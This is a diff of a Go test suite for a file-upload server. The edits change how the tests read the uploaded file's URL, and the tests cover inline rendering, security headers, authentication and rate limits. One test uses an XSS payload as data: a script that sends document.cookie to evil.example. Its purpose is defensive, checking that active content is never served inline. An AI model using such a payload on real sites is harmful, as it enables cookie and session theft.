@@ -138,7 +138,7 @@ func TestActiveContentIsNeverRenderedInline(t *testing.T) {
 	payload := `<script>fetch("https://evil.example/"+document.cookie)</script>`
 	for _, name := range []string{"page.html", "page.htm", "vector.svg", "doc.xhtml", "sheet.xsl", "data.xml"} {
 		got := h.uploadOK(t, [2]string{name, payload})
-		resp := h.do(t, http.MethodGet, got.URL, "")
+		resp := h.do(t, http.MethodGet, got.Files[0].URL, "")
 		body, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 
@@ -154,7 +154,7 @@ func TestActiveContentIsNeverRenderedInline(t *testing.T) {
 func TestEveryDownloadCarriesHardeningHeaders(t *testing.T) {
 	h := newHarness(t, nil)
 	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})
-	resp := h.do(t, http.MethodGet, got.URL, "")
+	resp := h.do(t, http.MethodGet, got.Files[0].URL, "")
 	defer resp.Body.Close()
 
 	want := map[string]string{
@@ -223,7 +223,7 @@ func TestAuthenticationRejectsEveryWrongCredential(t *testing.T) {
 	}
 	for _, tc := range headers {
 		for _, target := range []struct{ method, url string }{
-			{http.MethodDelete, got.URL},
+			{http.MethodDelete, got.Files[0].URL},
 			{http.MethodGet, h.URL + "/stats"},
 		} {
 			req, err := http.NewRequest(target.method, target.url, nil)
@@ -244,7 +244,7 @@ func TestAuthenticationRejectsEveryWrongCredential(t *testing.T) {
 		}
 	}
 	// The file survived every attempt.
-	resp := h.do(t, http.MethodGet, got.URL, "")
+	resp := h.do(t, http.MethodGet, got.Files[0].URL, "")
 	resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
 		t.Error("the file should still exist after the failed delete attempts")
@@ -403,7 +403,7 @@ func TestDownloadsAreNotRateLimited(t *testing.T) {
 	})
 	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})
 	for i := range 5 {
-		resp := h.do(t, http.MethodGet, got.URL, "")
+		resp := h.do(t, http.MethodGet, got.Files[0].URL, "")
 		resp.Body.Close()
 		if resp.StatusCode != http.StatusOK {
 			t.Fatalf("download %d = %d, want 200; public downloads must not be limited", i, resp.StatusCode)
